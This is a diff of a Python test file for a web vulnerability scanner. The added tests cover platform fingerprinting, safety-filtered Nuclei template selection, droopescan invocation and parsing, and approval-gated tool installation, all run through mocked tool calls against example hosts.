@@ -1168,6 +1168,7 @@ def _scan_with_missing_nuclei(monkeypatch, target="http://approval-test.example/
     for name in ("perform_whatweb_check", "perform_nikto_check", "perform_testssl_check"):
         monkeypatch.setattr(app, name, lambda *a, **k: ([], {"status": "completed"}))
     monkeypatch.setattr(app, "perform_nuclei_check", lambda *a, **k: ([], {"status": "unavailable", "reason": "Nuclei is not installed"}))
+    monkeypatch.setattr(app, "analyze_forms_and_apis", lambda *a, **k: ([], {"status": "completed"}, {"merge_urls": [], "api_urls": [], "facts": {}}))
     monkeypatch.setattr(app.shutil, "which", lambda binary: None if binary == "nuclei" else "/usr/bin/" + str(binary))
     fake_page = _FakeHTTP()
     fake_page.geturl = lambda: target
@@ -1238,7 +1239,7 @@ def test_approved_install_runs_the_stage_and_closes_the_gap(monkeypatch):
     monkeypatch.setattr(app, "_spawn", lambda function, *args: function(*args))
     monkeypatch.setattr(app, "install_package", lambda tool_id: (True, "Nuclei was installed from the Kali repository."))
     seen = {}
-    def fake_nuclei(target, timeout_seconds=60, targets=None, max_templates=30):
+    def fake_nuclei(target, timeout_seconds=60, targets=None, max_templates=30, platform_tags=None, platform_max=0):
         seen.update(targets=targets, templates=max_templates)
         return [("Medium", "Exposed admin panel", target + "admin", "evidence", "fix", "High")], {"status": "completed", "finding_count": 1}
     monkeypatch.setattr(app, "perform_nuclei_check", fake_nuclei)
@@ -1315,9 +1316,10 @@ def test_planner_applies_rules_by_profile_technology_and_parameters():
     standard = planner.Facts(profile="standard")
     deep = planner.Facts(profile="deep")
     active = planner.Facts(profile="active", has_parameters=True, technologies={"wordpress"})
-    assert [r.id for r in planner.RULES if planner.rule_applies(r, standard)] == []
-    assert [r.id for r in planner.RULES if planner.rule_applies(r, deep)] == ["content_discovery"]
-    assert {r.id for r in planner.RULES if planner.rule_applies(r, active)} == {"content_discovery", "wordpress", "sql_injection", "xss"}
+    assert [r.id for r in planner.RULES if planner.rule_applies(r, standard)] == ["forms_and_apis"]
+    assert [r.id for r in planner.RULES if planner.rule_applies(r, deep)] == ["content_discovery", "forms_and_apis"]
+    assert {r.id for r in planner.RULES if planner.rule_applies(r, active)} == {"content_discovery", "forms_and_apis", "wordpress", "sql_injection", "xss"}
+    assert [r.id for r in planner.RULES if planner.rule_applies(r, planner.Facts(profile="quick"))] == []
     # Technology-specific rules need the technology; injection rules need parameters.
     assert "wordpress" not in {r.id for r in planner.RULES if planner.rule_applies(r, planner.Facts(profile="deep"))}
     assert "sql_injection" not in {r.id for r in planner.RULES if planner.rule_applies(r, planner.Facts(profile="active"))}
@@ -1326,13 +1328,13 @@ def test_planner_applies_rules_by_profile_technology_and_parameters():
 def test_planner_reports_unavailable_engines_as_coverage_notes_not_silence():
     import planner
     facts = planner.Facts(profile="deep", technologies={"wordpress"}, url_count=5)
-    plan = planner.plan_coverage(facts, available_tools={"ffuf"})
-    assert [p["tool"] for p in plan["planned"]] == ["ffuf"]
+    plan = planner.plan_coverage(facts, available_tools={"ffuf", "builtin-forms-api"})
+    assert [p["tool"] for p in plan["planned"]] == ["ffuf", "builtin-forms-api"]
     assert [n["tool"] for n in plan["not_covered"]] == ["wpscan"]
     assert "not available in this version" in plan["not_covered"][0]["message"]
     assert "WordPress was detected" in plan["not_covered"][0]["message"]
     nothing_available = planner.plan_coverage(facts, available_tools=set())
-    assert {n["tool"] for n in nothing_available["not_covered"]} == {"ffuf", "wpscan"}
+    assert {n["tool"] for n in nothing_available["not_covered"]} == {"ffuf", "wpscan", "builtin-forms-api"}
     assert plan["facts"]["technologies"] == ["wordpress"]
 
 
@@ -1421,18 +1423,20 @@ def test_builtin_wordlist_is_present_and_bounded():
     assert ".git/HEAD" in lines and "admin" in lines and not any(" " in l or l.startswith("/") for l in lines)
 
 
-def _deep_scan(monkeypatch, ffuf_result, target="http://deep-test.example/", body="<html></html>", wpscan=None):
+def _deep_scan(monkeypatch, ffuf_result, target="http://deep-test.example/", body="<html></html>", wpscan=None, nuclei=None, droopescan=None, missing=(), forms_api=None):
     monkeypatch.setattr(app, "perform_zap_passive_check", lambda *a, **k: ([], {"status": "completed"}))
     for name in ("perform_whatweb_check", "perform_nikto_check", "perform_testssl_check", "perform_nuclei_check"):
         monkeypatch.setattr(app, name, lambda *a, **k: ([], {"status": "completed"}))
     seen = {}
-    def fake_nuclei(target, timeout_seconds=60, targets=None, max_templates=30):
+    def fake_nuclei(target, timeout_seconds=60, targets=None, max_templates=30, platform_tags=None, platform_max=0):
         seen["urls"] = targets
         return [], {"status": "completed"}
-    monkeypatch.setattr(app, "perform_nuclei_check", fake_nuclei)
+    monkeypatch.setattr(app, "perform_nuclei_check", nuclei or fake_nuclei)
     monkeypatch.setattr(app, "perform_ffuf_check", lambda *a, **k: ffuf_result)
     monkeypatch.setattr(app, "perform_wpscan_check", wpscan or (lambda *a, **k: ([], {"status": "completed"})))
-    monkeypatch.setattr(app.shutil, "which", lambda binary: "/usr/bin/" + str(binary))
+    monkeypatch.setattr(app, "perform_droopescan_check", droopescan or (lambda *a, **k: ([], {"status": "completed"})))
+    monkeypatch.setattr(app, "analyze_forms_and_apis", forms_api or (lambda *a, **k: ([], {"status": "completed"}, {"merge_urls": [], "api_urls": [], "facts": {}})))
+    monkeypatch.setattr(app.shutil, "which", lambda binary: None if binary in missing else "/usr/bin/" + str(binary))
     page = _FakeHTTP()
     page.geturl = lambda: target
     page.read = lambda _n=-1: body.encode()
@@ -1458,14 +1462,15 @@ def test_deep_scan_runs_content_discovery_and_feeds_found_pages_to_later_stages(
     assert summary["coverage"]["planned"][0]["tool"] == "ffuf" and summary["coverage"]["not_covered"] == []
 
 
-def test_standard_scan_skips_content_discovery_and_notes_uncovered_technology(monkeypatch):
-    scan_id, _ = _deep_scan(monkeypatch, ([], {"status": "completed"}), "http://joomla-test.example/",
-                            '<meta name="generator" content="Joomla! 4">')
+def test_standard_scan_skips_content_discovery_and_records_platform_coverage(monkeypatch):
+    def fake_nuclei(target, timeout_seconds=60, targets=None, max_templates=30, platform_tags=None, platform_max=0):
+        return [], {"status": "completed", "template_selection": {"platform_templates_available": {}}}
+    scan_id, _ = _deep_scan(monkeypatch, ([], {"status": "completed"}), "http://mw-test.example/",
+                            '<meta name="generator" content="MediaWiki 1.40">', nuclei=fake_nuclei)
     row, tools, summary = _scan_row(scan_id)
-    assert summary["coverage"]["facts"]["technologies"] == ["joomla"]
-    assert [n["tool"] for n in summary["coverage"]["not_covered"]] == ["joomscan"]
-    assert "not available in this version" in summary["coverage"]["not_covered"][0]["message"]
-    assert tools["WordPress (wpscan)"]["status"] == "skipped"  # Joomla is not WordPress
+    assert summary["coverage"]["facts"]["technologies"] == ["mediawiki"]
+    assert [n["rule"] for n in summary["coverage"]["not_covered"]] == ["platform_templates"]
+    assert tools["WordPress (wpscan)"]["status"] == "skipped" and tools["CMS checks (droopescan)"]["status"] == "skipped"
     assert row["status"] == "completed"  # a coverage note is information, not a failed stage
 
 
@@ -1480,7 +1485,7 @@ def test_missing_ffuf_asks_for_approval_then_runs_and_merges(monkeypatch):
     assert request["tool_id"] == "ffuf" and request["package"] == "ffuf"
     monkeypatch.setattr(app, "_spawn", lambda function, *args: function(*args))
     monkeypatch.setattr(app, "install_package", lambda tool_id: (True, "ffuf was installed from the Kali repository."))
-    monkeypatch.setattr(app, "perform_ffuf_check", lambda target, timeout_seconds=60: (
+    monkeypatch.setattr(app, "perform_ffuf_check", lambda target, timeout_seconds=60, extra_paths=None: (
         [("Info", "Hidden or unlinked content found: /docs", target + "docs", "e", "f", "Low")], {"status": "completed", "finding_count": 1}))
     client.post(f"/api/tool-requests/{request['id']}/decision", json={"decision": "approve"})
     _, tools, summary = _scan_row(scan_id)
@@ -1618,12 +1623,14 @@ def test_dalfox_timeout_is_an_incomplete_test(monkeypatch):
     assert app.perform_dalfox_check("http://t.example/", ["http://t.example/"])[1]["status"] == "skipped"
 
 
-def _active_scan(monkeypatch, urls, profile="active", sqlmap_result=None, dalfox_result=None):
+def _active_scan(monkeypatch, urls, profile="active", sqlmap_result=None, dalfox_result=None, forms_api=None):
     monkeypatch.setattr(app, "perform_zap_passive_check", lambda *a, **k: ([], {"status": "completed"}))
     for name in ("perform_whatweb_check", "perform_nikto_check", "perform_testssl_check", "perform_nuclei_check", "perform_wapiti_check"):
         monkeypatch.setattr(app, name, lambda *a, **k: ([], {"status": "completed"}))
     monkeypatch.setattr(app, "perform_ffuf_check", lambda *a, **k: ([], {"status": "completed"}))
     monkeypatch.setattr(app, "perform_wpscan_check", lambda *a, **k: ([], {"status": "completed"}))
+    monkeypatch.setattr(app, "perform_droopescan_check", lambda *a, **k: ([], {"status": "completed"}))
+    monkeypatch.setattr(app, "analyze_forms_and_apis", forms_api or (lambda *a, **k: ([], {"status": "completed"}, {"merge_urls": [], "api_urls": [], "facts": {}})))
     calls = []
     def fake_sqlmap(target, test_urls, *a, **k):
         calls.append(("sqlmap", list(test_urls))); return sqlmap_result or ([], {"status": "completed", "finding_count": 0})
@@ -1843,3 +1850,545 @@ def test_missing_wpscan_asks_for_approval_and_the_resumed_stage_uses_the_scan_pr
     assert request["tool_id"] == "wpscan" and request["package"] == "wpscan"
     client.post(f"/api/tool-requests/{request['id']}/decision", json={"decision": "approve"})
     assert seen["profile"] == "deep" and _scan_row(scan_id)[1]["WordPress (wpscan)"]["status"] == "completed"
+
+
+# ---- platform detection and platform-targeted checks -------------------------------------------------
+
+def test_platform_catalogue_is_well_formed():
+    import platforms, re
+    ids = [p.id for p in platforms.PLATFORMS]
+    assert len(ids) == len(set(ids)) and len(ids) >= 55
+    assert {p.group for p in platforms.PLATFORMS} == set(platforms.GROUP_LABELS)
+    for p in platforms.PLATFORMS:
+        for field_name in ("headers", "cookies", "body", "urls", "nuclei_tags"):
+            assert isinstance(getattr(p, field_name), tuple), (p.id, field_name)
+        for pattern in (*p.cookies, *p.body, *p.urls, *(pat for _, pat in p.headers)):
+            re.compile(pattern)
+        assert p.headers or p.cookies or p.body or p.urls, p.id          # every platform can actually be recognised
+        assert p.group == "frontend" or p.nuclei_tags, p.id              # and has templates to run, except front-end frameworks
+    assert platforms.BY_ID["shopify"].hosted and not platforms.BY_ID["wordpress"].hosted
+    assert {platforms.BY_ID[x].dedicated_tool for x in ("wordpress", "joomla", "drupal", "moodle", "silverstripe")} == {"wpscan", "droopescan"}
+
+
+def test_platform_detection_recognises_each_family_from_its_own_signals():
+    import platforms
+    d = platforms.detect_platforms
+    assert set(d({}, '<link href="/wp-content/themes/x/style.css">')) == {"wordpress"}
+    assert set(d({}, '<meta name="generator" content="Joomla! - Open Source Content Management">')) == {"joomla"}
+    assert set(d({"x-generator": "Drupal 10 (https://www.drupal.org)"}, "")) == {"drupal"}
+    assert set(d({"x-jenkins": "2.401"}, "")) == {"jenkins"}
+    assert set(d({"x-ausername": "anonymous", "x-arequestid": "1"}, "")) == {"jira"}
+    assert set(d({}, "", cookie_names=["laravel_session", "XSRF-TOKEN"])) == {"laravel"}
+    assert set(d({}, "", cookie_names=["ASP.NET_SessionId"])) == {"aspnet"}
+    assert set(d({"server": "Apache-Coyote/1.1"}, "")) == {"tomcat"}
+    assert set(d({"x-powered-by": "Express"}, "")) == {"express"}
+    assert set(d({}, "", urls=["http://t.example/login.action?x=1"])) == {"struts"}
+    assert set(d({"x-powered-by": "Next.js"}, '<script id="__NEXT_DATA__"></script>')) == {"nextjs"}
+    assert set(d({}, "", fingerprint_titles=["WhatWeb technology detected: Grafana"])) == {"grafana"}
+    assert set(d({}, '<app-root ng-version="15.2.0"></app-root>')) == {"angular"}
+    shop = d({"x-shopid": "1"}, '<script src="https://cdn.shopify.com/s/x.js">')
+    assert set(shop) == {"shopify"} and platforms.BY_ID["shopify"].hosted
+
+
+def test_platform_detection_avoids_false_positives_and_scores_confidence():
+    import platforms
+    d = platforms.detect_platforms
+    assert d({"server": "Apache/2.4.57 (Debian)"}, "<html>hello</html>", cookie_names=["PHPSESSID"]) == {}   # generic hints are never enough
+    assert d({"server": "nginx"}, "", fingerprint_titles=["WhatWeb technology detected: Apache"]) == {}       # "Apache" must not mean Tomcat or Struts
+    assert d({}, "") == {} and d(None, None) == {}
+    one = d({}, '<link href="/wp-content/x.css">')["wordpress"]
+    two = d({"link": '<https://example.com/wp-json/>; rel="https://api.w.org/"'}, '<link href="/wp-content/x.css">', cookie_names=["wordpress_logged_in_x"])["wordpress"]
+    assert one["confidence"] == "medium" and two["confidence"] == "high"
+    assert set(two["evidence"]) == {"cookie wordpress_logged_in_x", "header link", "page markup"}
+    woo = d({}, '<link href="/wp-content/plugins/woocommerce/a.css">')
+    assert set(woo) == {"woocommerce", "wordpress"}                      # WooCommerce implies WordPress
+    assert d({}, "<html>" + "x" * 5000 + "</html>") == {}
+
+
+def test_cookie_names_and_nuclei_tags_helpers():
+    import platforms
+    assert platforms.cookie_names_from_headers(["a=1; Path=/; HttpOnly", " b=2", "a=3", "", None, "=bad"]) == ["a", "b"]
+    assert platforms.cookie_names_from_headers(None) == [] and platforms.cookie_names_from_headers([]) == []
+    assert platforms.nuclei_tags_for(["wordpress", "jira", "unknown", "wordpress"]) == ["wordpress", "jira"]
+    assert platforms.nuclei_tags_for(["angular"]) == []
+    assert platforms.describe(["wordpress", "nope"])[0]["dedicated_tool"] == "wpscan"
+
+
+def _write_templates(root, specs):
+    root.mkdir(parents=True, exist_ok=True)
+    for name, tags, severity, extra in specs:
+        (root / f"{name}.yaml").write_text(
+            f"id: {name}\ninfo:\n  name: {name}\n  severity: {severity}\n  tags: {tags}\nhttp:\n  - method: GET\n    path:\n      - \"{{{{BaseURL}}}}/{name}\"\n{extra}")
+
+
+def test_nuclei_selection_adds_safe_platform_templates_first_and_fairly(monkeypatch, tmp_path):
+    root = tmp_path / "http"
+    _write_templates(root, [
+        ("wp-critical", "wordpress,cve", "critical", ""), ("wp-high", "wordpress,cve", "high", ""), ("wp-info", "wordpress,tech", "info", ""),
+        ("jira-medium", "jira,cve", "medium", ""), ("jira-low", "jira,exposure", "low", ""),
+        ("wp-fuzz", "wordpress,fuzz", "high", ""),                                 # excluded tag
+        ("wp-brute", "wordpress,bruteforce", "high", ""),                          # excluded tag
+        ("general-exposure", "exposure", "medium", ""), ("general-config", "misconfig", "low", ""),
+    ])
+    (root / "wp-post.yaml").write_text("id: wp-post\ninfo:\n  name: x\n  severity: high\n  tags: wordpress,cve\nhttp:\n  - method: POST\n    path:\n      - \"{{BaseURL}}/p\"\n")
+    (root / "wp-payload.yaml").write_text("id: wp-payload\ninfo:\n  name: x\n  severity: high\n  tags: wordpress\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/p\"\n    payloads:\n      a: [1]\n")
+    monkeypatch.setenv("DKCISSP_NUCLEI_TEMPLATES", str(root))
+    paths, status = app.select_nuclei_templates(max_templates=5, platform_tags=["wordpress", "jira"], platform_max=3)
+    names = [app.Path(p).stem for p in paths]
+    assert names[:3] == ["wp-critical", "jira-medium", "wp-high"]                   # platform templates first, severity order, shared fairly
+    assert not {"wp-fuzz", "wp-brute", "wp-post", "wp-payload"} & set(names)         # every safety filter still applies
+    assert {"general-exposure", "general-config"} <= set(names)                      # general selection is unchanged
+    assert status["platform_templates_selected"] == {"wordpress": 2, "jira": 1}
+    assert status["platform_templates_available"] == {"wordpress": 3, "jira": 2}
+    plain, plain_status = app.select_nuclei_templates(max_templates=5)               # no platform: exactly as before
+    assert plain_status["platform_templates_selected"] == {} and plain_status["platform_tags"] == []
+
+
+def test_nuclei_platform_cap_is_bounded_and_off_by_default(monkeypatch, tmp_path):
+    root = tmp_path / "http"
+    _write_templates(root, [(f"wp-{i}", "wordpress", "high", "") for i in range(10)])
+    monkeypatch.setenv("DKCISSP_NUCLEI_TEMPLATES", str(root))
+    paths, status = app.select_nuclei_templates(max_templates=2, platform_tags=["wordpress"], platform_max=4)
+    assert len([p for p in paths if "wp-" in p]) == 4 and status["platform_templates_selected"] == {"wordpress": 4}
+    assert app.select_nuclei_templates(max_templates=2, platform_tags=["wordpress"], platform_max=0)[1]["platform_templates_selected"] == {}
+
+
+def test_scan_runs_platform_targeted_nuclei_and_reports_what_it_recognised(monkeypatch):
+    seen = {}
+    def fake_nuclei(t, timeout_seconds=60, targets=None, max_templates=30, platform_tags=None, platform_max=0):
+        seen.update(tags=platform_tags, cap=platform_max, timeout=timeout_seconds)
+        return [], {"status": "completed", "template_selection": {"platform_templates_available": {"jira": 4, "wordpress": 7, "atlassian": 0}}}
+    scan_id, _ = _deep_scan(monkeypatch, ([], {"status": "completed"}), "http://multi.example/",
+                            '<link href="/wp-content/a.css"><meta name="ajs-version-number" content="9">', nuclei=fake_nuclei)
+    row, tools, summary = _scan_row(scan_id)
+    assert {"wordpress", "jira"} <= set(summary["platform_detection"])
+    assert set(seen["tags"]) >= {"wordpress", "jira"} and seen["cap"] == 40 and seen["timeout"] == 180   # Deep: 150 + 30 for platform templates
+    titles = [f["title"] for f in client.get(f"/api/scans/{scan_id}").json()["findings"]]
+    assert "Platform detected: WordPress" in titles and "Platform detected: Atlassian Jira" in titles
+    covered = {p["id"]: p["covered_by"] for p in summary["coverage"]["platforms"]}
+    assert "wpscan plus platform-targeted Nuclei templates" == covered["wordpress"]
+    assert covered["jira"] == "platform-targeted Nuclei templates"
+
+
+def test_scan_without_a_recognised_platform_runs_plain_nuclei(monkeypatch):
+    seen = {}
+    def fake_nuclei(t, timeout_seconds=60, targets=None, max_templates=30, platform_tags=None, platform_max=0):
+        seen.update(tags=platform_tags, cap=platform_max, timeout=timeout_seconds)
+        return [], {"status": "completed"}
+    scan_id, _ = _deep_scan(monkeypatch, ([], {"status": "completed"}), "http://plain2.example/", "<html>hello</html>", nuclei=fake_nuclei)
+    _, _, summary = _scan_row(scan_id)
+    assert summary["platform_detection"] == {} and summary["coverage"]["platforms"] == []
+    assert not seen.get("tags") and seen.get("cap", 0) == 0 and seen["timeout"] == 150
+
+
+def test_platform_without_templates_or_hosted_becomes_a_coverage_note(monkeypatch):
+    def fake_nuclei(t, timeout_seconds=60, targets=None, max_templates=30, platform_tags=None, platform_max=0):
+        return [], {"status": "completed", "template_selection": {"platform_templates_available": {}}}
+    scan_id, _ = _deep_scan(monkeypatch, ([], {"status": "completed"}), "http://notemplates2.example/",
+                            '<meta name="generator" content="MediaWiki 1.40"><script src="https://cdn.shopify.com/x.js"></script>', nuclei=fake_nuclei)
+    _, _, summary = _scan_row(scan_id)
+    notes = {n["rule"]: n for n in summary["coverage"]["not_covered"]}
+    assert "platform_templates" in notes and "MediaWiki" in notes["platform_templates"]["message"]
+    assert notes["hosted_platform"]["message"].startswith("A hosted service")
+
+
+def test_resumed_nuclei_stage_uses_the_platforms_found_by_the_scan(monkeypatch):
+    seen = {}
+    def fake_nuclei(t, timeout_seconds=60, targets=None, max_templates=30, platform_tags=None, platform_max=0):
+        seen.update(tags=platform_tags, cap=platform_max)
+        return [], {"status": "completed"}
+    monkeypatch.setattr(app, "perform_nuclei_check", fake_nuclei)
+    findings, status, state = app.run_engine_stage("nuclei", "http://t.example/", "standard", ["http://t.example/"], platform_ids=["drupal"])
+    assert seen == {"tags": ["drupal"], "cap": 20} and state["status"] == "completed"
+    app.run_engine_stage("nuclei", "http://t.example/", "deep", ["http://t.example/"])
+    assert seen["tags"] == [] and seen["cap"] == 0
+
+
+def test_response_set_cookies_reads_real_and_plain_headers():
+    from email.message import Message
+    message = Message(); message["Set-Cookie"] = "a=1"; message["Set-Cookie"] = "b=2"
+    assert app.response_set_cookies(message) == ["a=1", "b=2"]
+    assert app.response_set_cookies({"set-cookie": "c=3"}) == ["c=3"] and app.response_set_cookies({}) == [] and app.response_set_cookies(None) == []
+
+
+def test_nuclei_selection_rejects_state_changing_and_raw_templates_written_the_way_real_templates_are(monkeypatch, tmp_path):
+    root = tmp_path / "http"
+    root.mkdir()
+    head = "id: {n}\ninfo:\n  name: x\n  severity: high\n  tags: {tags}\nhttp:\n"
+    bodies = {
+        "ok-get": "  - method: GET\n    path:\n      - \"{{BaseURL}}/a\"\n",
+        "bad-post": "  - method: POST\n    path:\n      - \"{{BaseURL}}/a\"\n",
+        "bad-put": "  - method: PUT\n    path:\n      - \"{{BaseURL}}/a\"\n",
+        "bad-delete-quoted": "  - method: 'DELETE'\n    path:\n      - \"{{BaseURL}}/a\"\n",
+        "bad-raw": "  - raw:\n      - |\n        GET /a HTTP/1.1\n        Host: {{Hostname}}\n",
+        "bad-payloads": "  - method: GET\n    path:\n      - \"{{BaseURL}}/{{x}}\"\n    payloads:\n      x: [a]\n",
+        "bad-attack": "  - method: GET\n    path:\n      - \"{{BaseURL}}/{{x}}\"\n    attack: pitchfork\n",
+    }
+    for name, body in bodies.items():
+        (root / f"{name}.yaml").write_text(head.format(n=name, tags="exposure,wordpress") + body)
+    monkeypatch.setenv("DKCISSP_NUCLEI_TEMPLATES", str(root))
+    general, _ = app.select_nuclei_templates(max_templates=20)
+    targeted, _ = app.select_nuclei_templates(max_templates=20, platform_tags=["wordpress"], platform_max=20)
+    assert [app.Path(p).stem for p in general] == ["ok-get"]
+    assert [app.Path(p).stem for p in targeted] == ["ok-get"]
+
+
+# ---- droopescan (Drupal, Joomla, SilverStripe, Moodle) --------------------------------------------------
+
+DROOPESCAN_JSON = ('{"host": "http://t.example/", "cms_name": "drupal", '
+                   '"version": {"finds": ["7.50", "7.51", "7.52"], "is_empty": false}, '
+                   '"plugins": {"finds": [{"name": "views", "url": "http://t.example/sites/all/modules/views/"}], "is_empty": false}, '
+                   '"themes": {"finds": [{"name": "bartik", "url": "http://t.example/themes/bartik/"}], "is_empty": false}, '
+                   '"interesting urls": {"finds": [{"url": "http://t.example/CHANGELOG.txt", "description": "Default changelog file."}, '
+                   '{"url": "http://t.example/install.php", "description": "Installation script."}], "is_empty": false}}')
+
+
+def test_droopescan_parser_maps_version_modules_themes_and_default_files():
+    findings = app.parse_droopescan_output("banner text\n" + DROOPESCAN_JSON + "\nnot json\n[1]\n", "drupal", "http://t.example/")
+    titles = {f[1]: f for f in findings}
+    assert titles["Drupal version identified: 7.50 to 7.52 (3 candidates)"][0] == "Info"
+    assert titles["Drupal module/plugin detected: views"][2] == "http://t.example/sites/all/modules/views/"
+    assert "Drupal theme detected: bartik" in titles
+    assert titles["Default Drupal file reachable: Default changelog file."][0] == "Low"
+    assert titles["Default Drupal file reachable: Installation script."][0] == "Medium"   # an installer is more serious
+    assert app.parse_droopescan_output("", "drupal", "http://t/") == [] and app.parse_droopescan_output("{}", "drupal", "http://t/") == []
+    single = '{"version": {"finds": ["8.9.1"], "is_empty": false}}'
+    assert app.parse_droopescan_output(single, "joomla", "http://t/")[0][1] == "Joomla version identified: 8.9.1"
+
+
+def _fake_droopescan(monkeypatch, stdout="", capture=None, returncode=0):
+    monkeypatch.setattr(app.shutil, "which", lambda binary: "/usr/bin/droopescan")
+    class Done: pass
+    def fake_run(command, **kwargs):
+        if capture is not None:
+            capture.setdefault("commands", []).append(command)
+            capture["stdin"] = kwargs.get("stdin")
+        done = Done(); done.stdout = stdout if not callable(stdout) else stdout(command); done.stderr = ""; done.returncode = returncode
+        return done
+    monkeypatch.setattr(app.subprocess, "run", fake_run)
+
+
+def test_droopescan_runs_only_for_a_detected_cms_with_bounded_arguments(monkeypatch):
+    monkeypatch.setattr(app.shutil, "which", lambda binary: None)
+    assert app.perform_droopescan_check("http://t.example", [])[1]["status"] == "skipped"
+    assert app.perform_droopescan_check("http://t.example", ["wordpress", "jira"])[1]["status"] == "skipped"   # not droopescan's job
+    assert app.perform_droopescan_check("http://t.example", ["drupal"]) == ([], {"status": "unavailable", "reason": "droopescan is not installed"})
+    seen = {}
+    _fake_droopescan(monkeypatch, DROOPESCAN_JSON, seen)
+    findings, status = app.perform_droopescan_check("http://t.example", ["drupal", "joomla", "moodle"], profile="standard")
+    assert [c[2] for c in seen["commands"]] == ["drupal", "joomla"]                      # at most two CMS runs
+    command = seen["commands"][0]
+    assert command[:2] == ["/usr/bin/droopescan", "scan"] and command[command.index("-u") + 1] == "http://t.example/"
+    assert command[command.index("-o") + 1] == "json" and command[command.index("-t") + 1] == "2" and command[command.index("-n") + 1] == "100"
+    assert "--no-follow-redirects" in command and "--hide-progressbar" in command
+    assert not any(a in command for a in ("-U", "--url-file", "--massscan-override", "--debug-requests", "--host"))
+    assert seen["stdin"] == app.subprocess.DEVNULL
+    assert status["status"] == "completed" and status["cms"] == ["drupal", "joomla"] and findings
+    deep = {}
+    _fake_droopescan(monkeypatch, DROOPESCAN_JSON, deep)
+    app.perform_droopescan_check("http://t.example", ["drupal"], profile="deep")
+    assert deep["commands"][0][deep["commands"][0].index("-n") + 1] == "500"
+
+
+def test_droopescan_reports_not_that_cms_timeouts_and_errors_truthfully(monkeypatch):
+    import subprocess
+    _fake_droopescan(monkeypatch, "[+] It is possible that http://t.example/ is not running drupal.")
+    assert app.perform_droopescan_check("http://t.example", ["drupal"])[1] == {"status": "skipped", "reason": "droopescan did not confirm that the target runs Drupal"}
+    monkeypatch.setattr(app.subprocess, "run", lambda *a, **k: (_ for _ in ()).throw(subprocess.TimeoutExpired("droopescan", 60)))
+    status = app.perform_droopescan_check("http://t.example", ["drupal"])[1]
+    assert status["status"] == "timeout" and "findings so far are kept" in status["reason"]
+    calls = {"n": 0}
+    def flaky(command, **kwargs):
+        calls["n"] += 1
+        if calls["n"] == 1:
+            class R: stdout = DROOPESCAN_JSON; stderr = ""; returncode = 0
+            return R()
+        raise subprocess.TimeoutExpired("droopescan", 60)
+    monkeypatch.setattr(app.subprocess, "run", flaky)
+    findings, status = app.perform_droopescan_check("http://t.example", ["drupal", "joomla"])
+    assert status["status"] == "partial_timeout" and findings      # an unfinished run is a gap, but its findings are kept
+    monkeypatch.setattr(app.subprocess, "run", lambda *a, **k: (_ for _ in ()).throw(OSError("exec failed")))
+    assert app.perform_droopescan_check("http://t.example", ["drupal"])[1]["status"] == "error"
+
+
+def test_tool_readiness_version_can_come_from_a_regex_for_banner_tools(monkeypatch):
+    class R: returncode = 0; stdout = "    |\n ___| ___  ___\n                         v1.33.7\n"; stderr = ""
+    monkeypatch.setattr(app.subprocess, "run", lambda *a, **k: R())
+    assert app._tool_version(app.TOOL_CATALOG["droopescan"]) == "v1.33.7"
+    assert app._tool_version({"binary": "x", "version_args": ["-v"]}) == "|"          # tools without a regex keep the old behaviour
+
+
+def test_scan_runs_droopescan_for_a_detected_cms_and_skips_otherwise(monkeypatch):
+    calls = []
+    def fake_droopescan(target, cms_ids, profile="standard", timeout_seconds=240):
+        calls.append((list(cms_ids), profile))
+        return ([("Info", "Drupal version identified: 7.50", target, "e", "f", "Medium")], {"status": "completed", "finding_count": 1, "cms": list(cms_ids)})
+    scan_id, _ = _deep_scan(monkeypatch, ([], {"status": "completed"}), "http://drupal-run.example/",
+                            '<meta name="generator" content="Drupal 7 (https://www.drupal.org)">', droopescan=fake_droopescan)
+    row, tools, summary = _scan_row(scan_id)
+    assert calls == [(["drupal"], "deep")] and tools["CMS checks (droopescan)"]["status"] == "completed"
+    assert summary["droopescan_check"]["cms"] == ["drupal"] and "droopescan" in [p["tool"] for p in summary["coverage"]["planned"]]
+    assert any(f["title"].startswith("Drupal version identified") for f in client.get(f"/api/scans/{scan_id}").json()["findings"])
+    covered = {p["id"]: p["covered_by"] for p in summary["coverage"]["platforms"]}
+    assert covered["drupal"] == "droopescan plus platform-targeted Nuclei templates"
+    calls.clear()
+    plain_id, _ = _deep_scan(monkeypatch, ([], {"status": "completed"}), "http://not-cms.example/", "<html>x</html>", droopescan=fake_droopescan)
+    assert calls == [] and _scan_row(plain_id)[1]["CMS checks (droopescan)"]["status"] == "skipped"
+
+
+def test_missing_droopescan_asks_for_approval_and_the_resumed_stage_gets_the_detected_cms(monkeypatch):
+    scan_id, _ = _deep_scan(monkeypatch, ([], {"status": "completed"}), "http://joomla-missing.example/",
+                            '<meta name="generator" content="Joomla! 4">',
+                            droopescan=lambda *a, **k: ([], {"status": "unavailable", "reason": "droopescan is not installed"}), missing=("droopescan",))
+    row, tools, _ = _scan_row(scan_id)
+    assert tools["CMS checks (droopescan)"]["status"] == "needs_tool_approval"
+    request = client.get(f"/api/tool-requests?scan_id={scan_id}").json()
+    assert [r["tool_id"] for r in request if r["tool_id"] == "droopescan"] == ["droopescan"]
+    seen = {}
+    monkeypatch.setattr(app, "_spawn", lambda function, *args: function(*args))
+    monkeypatch.setattr(app, "install_package", lambda tool_id: (True, "droopescan was installed from the Kali repository."))
+    monkeypatch.setattr(app, "perform_droopescan_check", lambda target, cms_ids, profile="standard", timeout_seconds=240: (seen.update(cms=list(cms_ids), profile=profile) or
+                        ([("Info", "Joomla version identified: 3.9", target, "e", "f", "Medium")], {"status": "completed", "finding_count": 1})))
+    droop = next(r for r in request if r["tool_id"] == "droopescan")
+    assert client.post(f"/api/tool-requests/{droop['id']}/decision", json={"decision": "approve"}).status_code == 200
+    assert seen == {"cms": ["joomla"], "profile": "deep"} and _scan_row(scan_id)[1]["CMS checks (droopescan)"]["status"] == "completed"
+
+
+REAL_DROOPESCAN_OUTPUT = '{"plugins": {"finds": [{"name": "ctools", "url": "http://127.0.0.1:8093/sites/all/modules/ctools/", "imu": []}, {"name": "token", "url": "http://127.0.0.1:8093/sites/all/modules/token/", "imu": []}, {"name": "views", "url": "http://127.0.0.1:8093/sites/all/modules/views/", "imu": []}], "is_empty": false}, "themes": {"finds": [{"name": "zen", "url": "http://127.0.0.1:8093/sites/all/themes/zen/", "imu": []}], "is_empty": false}, "version": {"finds": [], "is_empty": true}, "interesting urls": {"finds": [{"url": "http://127.0.0.1:8093/CHANGELOG.txt", "description": "Default changelog file"}], "is_empty": false}, "host": "http://127.0.0.1:8093/", "cms_name": "drupal"}'
+
+
